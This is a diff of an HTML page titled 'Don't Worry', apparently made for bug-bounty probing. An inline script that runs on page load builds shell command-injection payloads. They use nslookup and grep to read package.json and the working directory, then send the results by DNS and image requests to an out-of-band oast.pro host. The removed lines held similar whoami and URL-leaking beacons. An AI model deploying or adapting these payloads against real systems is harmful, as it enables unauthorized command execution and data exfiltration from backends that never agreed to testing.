@@ -1,33 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Github Bug Bounty Test</title>
+    <meta charset="UTF-8">
+    <title>Don't Worry</title>
 </head>
+    <h1>Github Bug Bounty Test</h1>
 <body>
     <script>
         (function() {
-            // Your Collaborator ID
-            var oobID = "d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro"; 
-            
-            // 1. We try to leak the local info (URL/Referrer) first
-            var localInfo = btoa(window.location.href || document.referrer);
-            
-            // 2. We use an Image to bypass CORS entirely.
-            // Even if the command injection fails, we will see this request.
-            var img1 = new Image();
-            img1.src = "https://" + oobID + "/info?d=" + localInfo;
+            // 1. YOUR CONFIGURATION
+            const oobID = "9a5758d5b30f88782d53g1431jcyyyyyb.oast.pro"; 
 
-            // 3. We attempt the RCE Seek via a URL parameter.
-            // Some backends log the URL via Sentry - if they do, this triggers.
-            var img2 = new Image();
-            img2.src = "https://" + oobID + "/rce?cmd=$(nslookup $(whoami)." + oobID + ")";
+            // 2. THE COMMANDS
+            // This command:
+            // - Finds package.json
+            // - Grabs the 'name' value
+            // - Removes quotes and spaces
+            // - Truncates to 60 chars (DNS limit)
+            // - Appends your OOB ID
+            const pkgCmd = `$(nslookup $(grep '"name":' package.json | head -n 1 | cut -d'"' -f4 | tr -d ' ' | tr '[:upper:]' '[:lower:]' | cut -c1-60).${oobID})`;
             
-            console.log("Probes sent to listener.");
+            // This command checks for the CURRENT DIRECTORY name
+            const dirCmd = `$(nslookup $(basename $(pwd) | tr -d ' ').${oobID})`;
+
+            // 3. EXECUTION
+            // We use standard Image tags to bypass CORS and trigger the backend
+            
+            // Probe 1: Seek Internal Package Name
+            var img1 = new Image();
+            img1.src = `https://${oobID}/pkg-seek?name=${pkgCmd}`;
+
+            // Probe 2: Seek Working Directory Name
+            var img2 = new Image();
+            img2.src = `https://${oobID}/dir-seek?name=${dirCmd}`;
+
+            console.log("Dependency probes sent.");
         })();
     </script>
-    
-    <noscript>
-        <img src="https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/no-js-warning">
-    </noscript>
 </body>
 </html>
